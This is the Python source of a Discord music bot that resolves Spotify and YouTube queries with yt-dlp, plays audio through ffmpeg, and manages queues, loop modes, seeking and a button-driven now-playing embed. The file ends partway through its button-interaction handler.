import asyncio
import json
import os
import random
import re
import time
from urllib.parse import urlparse

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands
import yt_dlp


# ============================================================
# OPUS
# ============================================================

if not discord.opus.is_loaded():
    for lib_name in ("libopus.so.0", "libopus.so", "opus",
                     "/usr/lib/x86_64-linux-gnu/libopus.so.0"):
        try:
            discord.opus.load_opus(lib_name)
            print(f"[OPUS] Loaded: {lib_name}")
            break
        except OSError:
            continue
    if not discord.opus.is_loaded():
        print("[OPUS] WARNING: Could not load opus!")


# ============================================================
# BOT SETUP
# ============================================================

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.voice_states = True

bot = commands.Bot(command_prefix="!", intents=intents)

PURPLE = discord.Color.from_rgb(155, 93, 229)
SUPPORT_SERVER_INVITE = "https://discord.gg/5ygnUWdG7D"


# ============================================================
# CUSTOM EMOJIS – Sab None (Unicode fallback)
# ============================================================

CUSTOM_EMOJI_IDS = {
    "resume": None,
    "stop": None,
    "skip": None,
    "loop": None,
    "shuffle": None,
    "pause": None,
    "loop_off": None,
    "loop_track": None,
    "loop_queue": None,
}

_FALLBACK_EMOJI = {
    "pause": "⏸️",
    "resume": "▶️",
    "skip": "⏭️",
    "shuffle": "🔀",
    "loop": "🔁",
    "loop_off": "🔁",
    "loop_track": "🔂",
    "loop_queue": "🔁",
    "stop": "⏹️",
    "forward": "⏩",
    "backward": "⏪",
}

def get_emoji(key):
    emoji_id = CUSTOM_EMOJI_IDS.get(key)
    if emoji_id:
        emoji = bot.get_emoji(emoji_id)
        if emoji:
            return emoji
    return _FALLBACK_EMOJI.get(key, "✨")

def add_support_button(view=None):
    if view is None:
        view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="Support", emoji="🛟",
                                    style=discord.ButtonStyle.link,
                                    url=SUPPORT_SERVER_INVITE))
    return view


# ============================================================
# YT-DLP / FFMPEG (with optional cookies)
# ============================================================

COOKIES_FILE = os.getenv("YOUTUBE_COOKIES_FILE")

YTDL_OPTIONS = {
    "format": "bestaudio[abr>0]/bestaudio/best",
    "extractaudio": True,
    "audioformat": "mp3",
    "outtmpl": "%(extractor)s-%(id)s-%(title)s.%(ext)s",
    "restrictfilenames": True,
    "noplaylist": False,
    "nocheckcertificate": True,
    "ignoreerrors": False,
    "logtostderr": False,
    "quiet": True,
    "no_warnings": True,
    "default_search": "ytsearch",
    "source_address": "0.0.0.0",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "extractor_args": {
        "youtube": {
            "player_client": ["android", "web"]
        }
    }
}

if COOKIES_FILE and os.path.exists(COOKIES_FILE):
    YTDL_OPTIONS["cookiefile"] = COOKIES_FILE
    print(f"[YT-DLP] Using cookies from {COOKIES_FILE}")
else:
    print("[YT-DLP] No cookies file. YouTube may block requests.")

FFMPEG_OPTIONS = {
    "before_options": "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5",
    "options": "-vn"
}

ytdl = yt_dlp.YoutubeDL(YTDL_OPTIONS)
YTDL_FLAT_OPTIONS = dict(YTDL_OPTIONS)
YTDL_FLAT_OPTIONS["extract_flat"] = "in_playlist"
ytdl_flat = yt_dlp.YoutubeDL(YTDL_FLAT_OPTIONS)


# ============================================================
# STATE
# ============================================================

queues = {}
current_song = {}
loop_modes = {}
now_playing_messages = {}
queue_notice_messages = {}
progress_tasks = {}
guild_prefixes = {}
mode_247 = {}
last_track = {}

log_channels = {"join": None, "music": None, "error": None}

lock_spam_tasks = {}
lock_spam_messages = {}

CONFIG_FILE = os.getenv("CONFIG_FILE_PATH", "guild_config.json")
QUEUE_NOTICE_BUTTON_TIMEOUT = 15
NOW_PLAYING_REFRESH_SECONDS = 2
LOCK_SPAM_CHANNEL_DELAY = 0.4
LOCK_SPAM_ROUND_DELAY = 3.0


# ============================================================
# BOT OWNER IDS
# ============================================================

BOT_OWNER_IDS = {int(x) for x in os.getenv("BOT_OWNER_IDS", "").split(",") if x.strip().isdigit()}
def is_bot_owner(user_id):
    return user_id in BOT_OWNER_IDS


# ============================================================
# CONFIG (prefixes + log channels)
# ============================================================

def load_config():
    global guild_prefixes, log_channels
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        guild_prefixes = {int(k): str(v) for k, v in data.get("prefixes", {}).items()}
        log_channels["join"] = data.get("join_log_channel")
        log_channels["music"] = data.get("music_log_channel")
        log_channels["error"] = data.get("error_log_channel")
    except (FileNotFoundError, json.JSONDecodeError, OSError, ValueError):
        guild_prefixes = {}
        log_channels = {"join": None, "music": None, "error": None}

def save_config():
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "prefixes": {str(k): v for k, v in guild_prefixes.items()},
                "join_log_channel": log_channels["join"],
                "music_log_channel": log_channels["music"],
                "error_log_channel": log_channels["error"],
            }, f, indent=2)
    except OSError as e:
        print(f"[CONFIG SAVE ERROR] {e}")

def get_prefix(guild_id):
    return guild_prefixes.get(guild_id, "")

def parse_channel_arg(guild, arg):
    if not arg:
        return None
    arg = arg.strip().split()[0]
    match = re.match(r"<#(\d+)>", arg)
    if match:
        cid = int(match.group(1))
    else:
        try:
            cid = int(arg)
        except ValueError:
            return None
    ch = guild.get_channel(cid)
    return ch if isinstance(ch, discord.TextChannel) else None


# ============================================================
# HTTP SESSION
# ============================================================

_http_session = None
async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession()
    return _http_session


# ============================================================
# SPOTIFY API
# ============================================================

SPOTIFY_CLIENT_ID = os.getenv("SPOTIFY_CLIENT_ID")
SPOTIFY_CLIENT_SECRET = os.getenv("SPOTIFY_CLIENT_SECRET")
_spotify_token_cache = {"token": None, "expires_at": 0}

SPOTIFY_TRACK_RE = re.compile(r"open\.spotify\.com/(?:intl-\w+/)?track/([A-Za-z0-9]+)")
SPOTIFY_PLAYLIST_RE = re.compile(r"open\.spotify\.com/(?:intl-\w+/)?playlist/([A-Za-z0-9]+)")
SPOTIFY_ALBUM_RE = re.compile(r"open\.spotify\.com/(?:intl-\w+/)?album/([A-Za-z0-9]+)")

def spotify_url(query):
    if not isinstance(query, str):
        return False
    try:
        return urlparse(query.strip()).netloc.lower().endswith("spotify.com")
    except ValueError:
        return False

async def get_spotify_token():
    if not SPOTIFY_CLIENT_ID or not SPOTIFY_CLIENT_SECRET:
        return None
    if _spotify_token_cache["token"] and time.time() < _spotify_token_cache["expires_at"] - 30:
        return _spotify_token_cache["token"]
    try:
        session = await get_http_session()
        auth = aiohttp.BasicAuth(SPOTIFY_CLIENT_ID, SPOTIFY_CLIENT_SECRET)
        async with session.post("https://accounts.spotify.com/api/token",
                                data={"grant_type": "client_credentials"},
                                auth=auth,
                                timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return None
            data = await resp.json()
            _spotify_token_cache["token"] = data.get("access_token")
            _spotify_token_cache["expires_at"] = time.time() + data.get("expires_in", 3600)
            return _spotify_token_cache["token"]
    except Exception as e:
        print(f"[SPOTIFY TOKEN ERROR] {e}")
        return None

async def spotify_get(endpoint):
    token = await get_spotify_token()
    if not token:
        return None
    try:
        session = await get_http_session()
        headers = {"Authorization": f"Bearer {token}"}
        async with session.get(f"https://api.spotify.com/v1/{endpoint}",
                               headers=headers,
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return None
            return await resp.json()
    except Exception as e:
        print(f"[SPOTIFY API ERROR] {e}")
        return None

async def spotify_search_tracks(query: str, limit: int = 1):
    if not SPOTIFY_CLIENT_ID or not SPOTIFY_CLIENT_SECRET:
        return None
    token = await get_spotify_token()
    if not token:
        return None
    try:
        session = await get_http_session()
        headers = {"Authorization": f"Bearer {token}"}
        params = {"q": query, "type": "track", "limit": limit}
        async with session.get("https://api.spotify.com/v1/search",
                               headers=headers, params=params,
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return None
            data = await resp.json()
            return data.get("tracks", {}).get("items", [])
    except Exception as e:
        print(f"[SPOTIFY SEARCH ERROR] {e}")
        return None

async def spotify_recommendations(seed_tracks=None, seed_artists=None, seed_genres=None, limit=5):
    token = await get_spotify_token()
    if not token:
        return None
    params = {"limit": limit}
    if seed_tracks:
        params["seed_tracks"] = ",".join(seed_tracks[:5])
    if seed_artists:
        params["seed_artists"] = ",".join(seed_artists[:5])
    if seed_genres:
        params["seed_genres"] = ",".join(seed_genres[:5])
    if not any([seed_tracks, seed_artists, seed_genres]):
        return None
    try:
        session = await get_http_session()
        headers = {"Authorization": f"Bearer {token}"}
        async with session.get("https://api.spotify.com/v1/recommendations",
                               headers=headers, params=params,
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return None
            data = await resp.json()
            return data.get("tracks", [])
    except Exception as e:
        print(f"[SPOTIFY RECS ERROR] {e}")
        return None

def format_track(track):
    artists = ", ".join(a["name"] for a in track.get("artists", []))
    return f"**{track['name']}** by {artists}"

async def resolve_spotify_link(url):
    if "/s/" in url or not (SPOTIFY_TRACK_RE.search(url) or SPOTIFY_PLAYLIST_RE.search(url) or SPOTIFY_ALBUM_RE.search(url)):
        url = await resolve_spotify_short_link(url)

    has_api = bool(SPOTIFY_CLIENT_ID and SPOTIFY_CLIENT_SECRET)
    track_match = SPOTIFY_TRACK_RE.search(url)
    if track_match:
        if has_api:
            data = await spotify_get(f"tracks/{track_match.group(1)}")
            if data:
                return [data]
        title = await _spotify_oembed_title(url)
        if title:
            return [{"name": title, "artists": [{"name": "Unknown"}]}]
        return []

    playlist_match = SPOTIFY_PLAYLIST_RE.search(url)
    if playlist_match:
        if not has_api:
            return None
        data = await spotify_get(f"playlists/{playlist_match.group(1)}")
        if not data:
            return []
        return [item["track"] for item in data.get("tracks", {}).get("items", []) if item.get("track")]

    album_match = SPOTIFY_ALBUM_RE.search(url)
    if album_match:
        if not has_api:
            return None
        data = await spotify_get(f"albums/{album_match.group(1)}")
        if not data:
            return []
        return data.get("tracks", {}).get("items", [])

    return []

async def resolve_spotify_short_link(url):
    try:
        session = await get_http_session()
        async with session.get(url, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            return str(resp.url)
    except Exception:
        return url

async def _spotify_oembed_title(url):
    try:
        session = await get_http_session()
        async with session.get("https://open.spotify.com/oembed",
                               params={"url": url},
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return None
            data = await resp.json()
            return data.get("title")
    except Exception:
        return None


# ============================================================
# QUERY RESOLUTION – Spotify FIRST, then YouTube FALLBACK
# ============================================================

async def resolve_query_items(query, requester):
    if spotify_url(query):
        tracks = await resolve_spotify_link(query)
        if tracks is None:
            print("[RESOLVE] Spotify link failed, falling back to YouTube direct.")
            return await resolve_youtube(query, requester)
        if not tracks:
            raise RuntimeError("No tracks found in that Spotify link.")
        items = []
        for t in tracks:
            if isinstance(t, dict):
                search_q = _track_search_query(t)
                try:
                    yt_item = await resolve_youtube(search_q, requester, single=True)
                    if yt_item:
                        yt_item[0]["spotify_track"] = t
                        items.extend(yt_item)
                    else:
                        items.append({
                            "query": search_q,
                            "title": t.get("name", "Unknown"),
                            "thumbnail": t.get("album", {}).get("images", [{}])[0].get("url"),
                            "webpage_url": t.get("external_urls", {}).get("spotify", ""),
                            "requester": requester,
                            "spotify_track": t
                        })
                except Exception as e:
                    print(f"[SPOTIFY->YOUTUBE ERROR] {e}")
                    items.append({
                        "query": search_q,
                        "title": t.get("name", "Unknown"),
                        "thumbnail": t.get("album", {}).get("images", [{}])[0].get("url"),
                        "webpage_url": t.get("external_urls", {}).get("spotify", ""),
                        "requester": requester,
                        "spotify_track": t
                    })
        return items

    if not query.startswith(("http://", "https://")):
        spotify_tracks = await spotify_search_tracks(query, limit=1)
        if spotify_tracks:
            t = spotify_tracks[0]
            search_q = _track_search_query(t)
            try:
                yt_items = await resolve_youtube(search_q, requester, single=True)
                if yt_items:
                    yt_items[0]["spotify_track"] = t
                    return yt_items
            except Exception as e:
                print(f"[SPOTIFY->YOUTUBE FALLBACK] {e}")
                return [{
                    "query": search_q,
                    "title": t.get("name", "Unknown"),
                    "thumbnail": t.get("album", {}).get("images", [{}])[0].get("url"),
                    "webpage_url": t.get("external_urls", {}).get("spotify", ""),
                    "requester": requester,
                    "spotify_track": t
                }]

    return await resolve_youtube(query, requester)

async def resolve_youtube(query, requester, single=False):
    loop = asyncio.get_event_loop()
    extractor = ytdl_flat if is_playlist_url(query) else ytdl
    data = await loop.run_in_executor(None, lambda: extractor.extract_info(query, download=False))
    if not data:
        raise RuntimeError("No result found.")
    if data.get("entries"):
        entries = [e for e in data["entries"] if e]
        if not entries:
            raise RuntimeError("No playable entries found.")
        if is_playlist_url(query) and not single:
            return [{
                "query": e.get("webpage_url") or e.get("url") or e.get("title"),
                "title": e.get("title", "Unknown Track"),
                "thumbnail": e.get("thumbnail"),
                "webpage_url": e.get("webpage_url", ""),
                "requester": requester
            } for e in entries]
        e = entries[0]
        return [{
            "query": e.get("webpage_url") or query,
            "title": e.get("title", "Unknown Track"),
            "thumbnail": e.get("thumbnail"),
            "webpage_url": e.get("webpage_url", ""),
            "requester": requester,
            "stream_url": e.get("url"),
            "duration_sec": e.get("duration") or 0
        }]
    return [{
        "query": query,
        "title": data.get("title", query),
        "thumbnail": data.get("thumbnail"),
        "webpage_url": data.get("webpage_url", ""),
        "requester": requester,
        "stream_url": data.get("url"),
        "duration_sec": data.get("duration") or 0
    }]

def _track_search_query(track):
    artists = ", ".join(a["name"] for a in track.get("artists", []))
    title = track.get("name", "")
    return f"{artists} - {title}".strip(" -") or title

def is_playlist_url(query):
    q = str(query).lower()
    return "list=" in q or "/playlist" in q or "music.youtube.com/playlist" in q


# ============================================================
# PLAYBACK / QUEUE HELPERS
# ============================================================

def get_queue(guild_id):
    return queues.setdefault(guild_id, [])

def next_loop_mode(current):
    if current is None:
        return "track"
    if current == "track":
        return "queue"
    return None

def get_loop_label(guild_id):
    mode = loop_modes.get(guild_id)
    if mode == "track":
        return "Track"
    if mode == "queue":
        return "Queue"
    return "Off"

def format_time(seconds):
    seconds = int(max(0, seconds))
    m, s = divmod(seconds, 60)
    h, m = divmod(m, 60)
    if h:
        return f"{h:d}:{m:02d}:{s:02d}"
    return f"{m:02d}:{s:02d}"

def format_queue_names(guild_id, limit=8):
    queue = get_queue(guild_id)
    if not queue:
        return "empty"
    lines = []
    for i, item in enumerate(queue[:limit], 1):
        title = item.get("title") or item.get("query") or "Unknown"
        lines.append(f"{i}. {title[:80]}")
    if len(queue) > limit:
        lines.append(f"… and {len(queue) - limit} more")
    return "\n".join(lines)

def get_elapsed_seconds(guild_id):
    song = current_song.get(guild_id)
    if not song:
        return 0
    now = time.time()
    elapsed = now - song.get("start_time", now) - song.get("paused_total", 0.0)
    if song.get("paused_at"):
        elapsed -= now - song["paused_at"]
    duration = song.get("duration_sec") or 0
    if duration:
        return max(0, min(elapsed, duration))
    return max(0, elapsed)

def build_progress_bar(elapsed, duration, length=20):
    if not duration:
        return "●"
    ratio = max(0, min(elapsed / duration, 1))
    filled = max(1, round(ratio * length))
    empty = length - filled
    return "●" * filled + "○" * empty

def mark_paused(guild_id):
    song = current_song.get(guild_id)
    if song and not song.get("paused_at"):
        song["paused_at"] = time.time()

def mark_resumed(guild_id):
    song = current_song.get(guild_id)
    if song and song.get("paused_at"):
        song["paused_total"] = song.get("paused_total", 0.0) + (time.time() - song["paused_at"])
        song["paused_at"] = None


# ============================================================
# NOW PLAYING EMBED – Clean, with progress bar
# ============================================================

def build_now_playing_embed(guild_id, finished=False, paused=False):
    song = current_song.get(guild_id)
    if not song:
        embed = discord.Embed(
            description="### ◈ Nothing Casting\n▹▹▹▹▹▹▹▹▹▹▹▹▹▹▹▹▹▹▹▹",
            color=PURPLE
        )
        embed.set_footer(text="✦ Queue a track with /play")
        return embed

    elapsed = get_elapsed_seconds(guild_id)
    duration_sec = song.get("duration_sec") or 0
    bar = build_progress_bar(elapsed, duration_sec)
    
    artist = song.get("artist", "Unknown Artist")
    title = song['title']
    track_link = song.get('webpage_url', '') or title

    embed = discord.Embed(
        description=(
            f"### [{title}]({track_link})\n"
            f"**Artist:** {artist}\n"
            f"{bar}\n"
            f"`{format_time(elapsed)} / {song.get('duration_str', 'Unknown')}`"
        ),
        color=PURPLE
    )
    
    if finished:
        embed.set_author(name="✅ FINISHED")
    elif paused:
        embed.set_author(name="⏸️ PAUSED")
    else:
        embed.set_author(name="◈ NOW CASTING")
    
    if song.get("thumbnail"):
        embed.set_image(url=song["thumbnail"])
    
    embed.add_field(name="⏱️ DURATION", value=f"`{song.get('duration_str', 'Unknown')}`", inline=True)
    embed.add_field(name="🔁 LOOP", value=f"`{get_loop_label(guild_id)}`", inline=True)
    embed.add_field(name="📃 UP NEXT", value=format_queue_names(guild_id), inline=False)
    
    requester = song.get("requester")
    if requester:
        embed.set_footer(
            text=f"🪄 cast by {requester.display_name} · updates every 2s",
            icon_url=requester.display_avatar.url
        )
    return embed


# ============================================================
# MUSIC VIEW – with Seek Buttons, no deletion
# ============================================================

class MusicView(discord.ui.View):
    def __init__(self, guild_id):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        
        self.add_item(discord.ui.Button(
            label="Pause", emoji=get_emoji("pause"),
            style=discord.ButtonStyle.primary, custom_id="pause"
        ))
        self.add_item(discord.ui.Button(
            label="Skip", emoji=get_emoji("skip"),
            style=discord.ButtonStyle.secondary, custom_id="skip"
        ))
        self.add_item(discord.ui.Button(
            label="Shuffle", emoji=get_emoji("shuffle"),
            style=discord.ButtonStyle.secondary, custom_id="shuffle"
        ))
        self.add_item(discord.ui.Button(
            label="Loop: Off", emoji=get_emoji("loop"),
            style=discord.ButtonStyle.secondary, custom_id="loop"
        ))
        self.add_item(discord.ui.Button(
            label="Stop", emoji=get_emoji("stop"),
            style=discord.ButtonStyle.danger, custom_id="stop"
        ))
        self.add_item(discord.ui.Button(
            label="-10s", emoji=get_emoji("backward"),
            style=discord.ButtonStyle.secondary, custom_id="backward"
        ))
        self.add_item(discord.ui.Button(
            label="+10s", emoji=get_emoji("forward"),
            style=discord.ButtonStyle.secondary, custom_id="forward"
        ))
        add_support_button(self)
    
    async def interaction_check(self, interaction):
        return True


# ============================================================
# QUEUE NOTICE VIEW – timeout 15s, no deletion
# ============================================================

class QueueNoticeView(discord.ui.View):
    def __init__(self, guild_id, queue_item_id):
        super().__init__(timeout=QUEUE_NOTICE_BUTTON_TIMEOUT)
        self.guild_id = guild_id
        self.queue_item_id = queue_item_id
        self.created_at = time.time()
        self.add_item(discord.ui.Button(
            label="Move to Top", emoji="⬆️",
            style=discord.ButtonStyle.primary,
            custom_id=f"move_top_{queue_item_id}"
        ))
        self.add_item(discord.ui.Button(
            label="Remove", emoji="🗑️",
            style=discord.ButtonStyle.danger,
            custom_id=f"remove_{queue_item_id}"
        ))
        add_support_button(self)
    
    async def interaction_check(self, interaction):
        if time.time() - self.created_at > QUEUE_NOTICE_BUTTON_TIMEOUT:
            await interaction.response.send_message("⏰ These buttons have expired.", ephemeral=True)
            return False
        return True


# ============================================================
# PLAYBACK FUNCTIONS
# ============================================================

async def ensure_voice(user, guild):
    if not user.voice or not user.voice.channel:
        return None, "🚫 Hop into a voice channel first!"
    voice_channel = user.voice.channel
    vc = guild.voice_client
    if not vc:
        vc = await voice_channel.connect(self_deaf=True, self_mute=False)
    elif vc.channel != voice_channel:
        await vc.move_to(voice_channel)
    return vc, None

async def stop_playback(guild, delete_message=None):
    guild_id = guild.id
    queues[guild_id] = []
    loop_modes[guild_id] = None
    vc = guild.voice_client
    if vc:
        vc.stop()
        await vc.disconnect()
    current_song.pop(guild_id, None)
    await update_now_playing_message(guild_id, finished=True)
    await update_bot_presence()
    if delete_message:
        try:
            await delete_message.delete()
        except:
            pass

async def delete_now_playing(guild_id):
    task = progress_tasks.pop(guild_id, None)
    if task and not task.done():
        task.cancel()
    # We don't delete the message, just update it to finished.

async def update_bot_presence():
    try:
        await bot.change_presence(activity=discord.Game(name=server_status()))
    except Exception as e:
        print(f"[PRESENCE ERROR] {e}")

def server_status():
    return f"✦ Casting {len(bot.guilds)} servers"

async def set_vc_status(channel_id, status_text):
    if not channel_id:
        return
    session = await get_http_session()
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        return
    url = f"https://discord.com/api/v10/channels/{channel_id}/voice-status"
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    try:
        async with session.put(url, headers=headers, json={"status": (status_text or "")[:500]}) as resp:
            if resp.status not in (200, 204):
                print(f"[VC STATUS ERROR] {resp.status}: {await resp.text()}")
    except Exception as e:
        print(f"[VC STATUS ERROR] {e}")

async def update_now_playing_message(guild_id, finished=False, paused=False):
    msg = now_playing_messages.get(guild_id)
    if not msg:
        return None
    guild = bot.get_guild(guild_id)
    vc = guild.voice_client if guild else None
    try:
        embed = build_now_playing_embed(guild_id, finished=finished, paused=paused)
        view = MusicView(guild_id) if not finished else discord.ui.View()
        if finished:
            for child in view.children:
                child.disabled = True
        await msg.edit(embed=embed, view=view)
        return None
    except discord.NotFound:
        now_playing_messages.pop(guild_id, None)
        return None
    except discord.HTTPException as e:
        if getattr(e, "status", None) == 429:
            return getattr(e, "retry_after", 3)
        print(f"[REFRESH ERROR] {e}")
        return None

async def now_playing_refresh_loop(guild_id):
    try:
        while current_song.get(guild_id):
            await asyncio.sleep(NOW_PLAYING_REFRESH_SECONDS)
            if not current_song.get(guild_id):
                break
            backoff = await update_now_playing_message(guild_id)
            if backoff:
                await asyncio.sleep(backoff)
    except asyncio.CancelledError:
        pass
    finally:
        progress_tasks.pop(guild_id, None)

def start_now_playing_refresh(guild_id):
    old = progress_tasks.get(guild_id)
    if old and not old.done():
        old.cancel()
    progress_tasks[guild_id] = asyncio.create_task(now_playing_refresh_loop(guild_id))

async def play_next(guild, channel, send_func=None, preloaded=None):
    guild_id = guild.id
    vc = guild.voice_client
    if not vc:
        return

    if preloaded is not None:
        query = preloaded.get("query")
        requester = preloaded.get("requester")
        song_data = preloaded
    elif loop_modes.get(guild_id) == "track" and current_song.get(guild_id):
        query = current_song[guild_id]["_query"]
        requester = current_song[guild_id]["requester"]
        song_data = None
    else:
        queue = get_queue(guild_id)
        if not queue:
            current_song.pop(guild_id, None)
            await update_now_playing_message(guild_id, finished=True)
            try:
                await vc.disconnect()
            except:
                pass
            await update_bot_presence()
            return
        item = queue.pop(0)
        query = item["query"]
        requester = item["requester"]
        song_data = item

    loop = asyncio.get_event_loop()

    if song_data and song_data.get("stream_url"):
        song_url = song_data["stream_url"]
        title = song_data.get("title", "Unknown Track")
        duration_sec = song_data.get("duration_sec") or 0
        thumbnail = song_data.get("thumbnail")
        webpage_url = song_data.get("webpage_url", "")
        spotify_track = song_data.get("spotify_track")
        if spotify_track:
            artist = ", ".join(a["name"] for a in spotify_track.get("artists", []))
        else:
            artist = "Unknown Artist"
        minutes, seconds = divmod(int(duration_sec), 60)
        duration_str = f"{minutes:02d}:{seconds:02d}"
    else:
        try:
            data = await loop.run_in_executor(None, lambda: ytdl.extract_info(query, download=False))
            if not data:
                raise RuntimeError("No media result.")
            if data.get("entries"):
                entries = [e for e in data["entries"] if e]
                if not entries:
                    raise RuntimeError("No playable entries.")
                data = entries[0]
            song_url = data.get("url")
            if not song_url:
                raise RuntimeError("No audio URL found.")
            title = data.get("title", "Unknown Track")
            duration_sec = data.get("duration") or 0
            thumbnail = data.get("thumbnail")
            webpage_url = data.get("webpage_url", "")
            artist = "Unknown Artist"
            minutes, seconds = divmod(int(duration_sec), 60)
            duration_str = f"{minutes:02d}:{seconds:02d}"
        except Exception as e:
            error_detail = str(e)
            if "sign in" in error_detail.lower() or "cookies" in error_detail.lower():
                hint = "\n\n💡 YouTube is blocking this request. Set `YOUTUBE_COOKIES_FILE`."
            else:
                hint = ""
            if send_func:
                await send_func(text=f"😵‍💫 Couldn't cast **{query}** — skipping.\n`{error_detail}`{hint}",
                                view=add_support_button())
            await log_error(guild, query, error_detail)
            await play_next(guild, channel, send_func)
            return

    current_song[guild_id] = {
        "title": title,
        "artist": artist,
        "webpage_url": webpage_url,
        "thumbnail": thumbnail,
        "duration_str": duration_str,
        "duration_sec": duration_sec,
        "requester": requester,
        "_query": query,
        "start_time": time.time(),
        "paused_at": None,
        "paused_total": 0.0,
        "stream_url": song_url,
        "current_position": 0.0,
    }

    def after_play(error):
        if error:
            print(f"[PLAYER ERROR] {error}")
        if loop_modes.get(guild_id) == "queue":
            get_queue(guild_id).append({
                "query": query,
                "title": title,
                "thumbnail": thumbnail,
                "webpage_url": webpage_url,
                "requester": requester,
                "spotify_track": song_data.get("spotify_track") if song_data else None,
                "_queue_id": f"{time.time_ns()}-loop"
            })
        asyncio.run_coroutine_threadsafe(play_next(guild, channel), bot.loop)

    try:
        source = discord.FFmpegPCMAudio(song_url, **FFMPEG_OPTIONS)
        vc.play(source, after=after_play)
    except Exception as e:
        if send_func:
            await send_func(text=f"❌ Playback error: `{e}`", view=add_support_button())
        await log_error(guild, query, e)
        return

    await update_now_playing_message(guild_id, finished=False)
    await set_vc_status(vc.channel.id, f"🎶 {title}"[:100])
    await update_bot_presence()
    await log_music(guild, channel, title, webpage_url, requester, thumbnail)

    if not now_playing_messages.get(guild_id):
        msg = await channel.send(embed=build_now_playing_embed(guild_id), view=MusicView(guild_id))
        now_playing_messages[guild_id] = msg
    else:
        await update_now_playing_message(guild_id)

    start_now_playing_refresh(guild_id)

async def enqueue_song(guild, channel, user, query, send_func):
    vc, err = await ensure_voice(user, guild)
    if err:
        return await send_func(text=err, view=add_support_button())

    try:
        items = await resolve_query_items(query, user)
    except Exception as e:
        return await send_func(text=f"😵‍💫 Couldn't add **{query}**.\n`{e}`", view=add_support_button())

    was_playing = vc.is_playing() or vc.is_paused()

    for idx, item in enumerate(items):
        item.setdefault("query", query)
        item.setdefault("title", item.get("query", "Unknown Track"))
        item.setdefault("requester", user)
        item["_queue_id"] = f"{time.time_ns()}-{random.randint(1000, 9999)}"
        item["queue_position"] = len(get_queue(guild.id)) + idx + 1

    if was_playing:
        for item in items:
            get_queue(guild.id).append(item)
        for item in items[:10]:
            await send_queue_added_embed(guild, channel, user, item)
        if len(items) > 10:
            await send_func(text=f"✦ Added **{len(items)}** tracks to the queue.")
        await update_now_playing_message(guild.id)
    else:
        preload_item = items[0]
        for item in items[1:]:
            get_queue(guild.id).append(item)
        await play_next(guild, channel, send_func, preloaded=preload_item)

async def send_queue_added_embed(guild, channel, user, item):
    title = item.get('title', item.get('query', 'Unknown Track'))
    pos = item.get('queue_position', len(get_queue(guild.id)))
    embed = discord.Embed(
        title="✦ Added to Queue",
        description=f"**{title}** added to queue at position **#{pos}** by **{user.display_name}**",
        color=PURPLE
    )
    embed.set_footer(text="Buttons active for 15s • expires after 15s")
    view = QueueNoticeView(guild.id, item["_queue_id"])
    msg = await channel.send(embed=embed, view=view)
    return msg


# ============================================================
# SEEK FUNCTIONALITY
# ============================================================

async def seek_audio(guild_id, delta):
    song = current_song.get(guild_id)
    if not song:
        return False
    vc = bot.get_guild(guild_id).voice_client
    if not vc or not vc.is_playing():
        return False
    current_elapsed = get_elapsed_seconds(guild_id)
    new_pos = max(0, current_elapsed + delta)
    duration = song.get("duration_sec") or 0
    if duration and new_pos > duration:
        new_pos = duration
    vc.stop()
    song["start_time"] = time.time() - new_pos - song.get("paused_total", 0.0)
    song["current_position"] = new_pos
    song_url = song.get("stream_url")
    if not song_url:
        return False
    ffmpeg_opts = {
        "before_options": f"-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 -ss {new_pos}",
        "options": "-vn"
    }
    source = discord.FFmpegPCMAudio(song_url, **ffmpeg_opts)
    def after_seek(error):
        if error:
            print(f"[SEEK ERROR] {error}")
    vc.play(source, after=after_seek)
    await update_now_playing_message(guild_id)
    return True


# ============================================================
# BUTTON INTERACTIONS
# ============================================================

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type != discord.InteractionType.component:
        return

    custom_id = interaction.data.get("custom_id")
    if not custom_id:
        return

    guild = interaction.guild
    if not guild:
        return
    guild_id = guild.id
    vc = guild.voice_client

    # MusicView buttons
    if custom_id in ("pause", "skip", "shuffle", "loop", "stop", "forward", "backward"):
        if custom_id == "pause":
            if not vc or not vc.is_playing():
                await interaction.response.send_message("❌ Nothing playing.", ephemeral=True)
                return
            if vc.is_paused():
                vc.resume()
                mark_resumed(guild_id)
                await interaction.response.edit_message(embed=build_now_playing_embed(guild_id, paused=False), view=MusicView(guild_id))
                await interaction.followup.send(f"▶️ Resumed")
            else:
                vc.pause()
                mark_paused(guild_id)
                await interaction.response.edit_message(embed=build_now_playing_embed(guild_id, paused=True), view=MusicView(guild_id))
                await interaction.followup.send(f"⏸️ Paused")

        elif custom_id == "skip":
            if vc and (vc.is_playing() or vc.is_paused()):
                vc.stop()
                await interaction.response.send_message(f"⏭️ Skipped")
            else:
                await interaction.response.send_message("❌ Nothing to skip.", ephemeral=True)

        elif custom_id == "shuffle":
            queue = get_queue(guild_id)
            if len(queue) < 2:
                await interaction.response.send_message("❌ Need at least 2 songs.", ephemeral=True)
                return
            random.shuffle(queue)
            await interaction.response.send_message(f"🔀 Queue shuffled")
            await update_now_playing_message(guild_id)

        elif custom_id == "loop":
            self_mode = loop_modes.get(guild_id)
            loop_modes[guild_id] = next_loop_mode(self_mode)
            await interaction.response.edit_message(embed=build_now_playing_embed(guild_id), view=MusicView(guild_id))

        elif custom_id == "stop":
            await interaction.response.defer()
            await stop_playback(guild, delete_message=interaction.message)
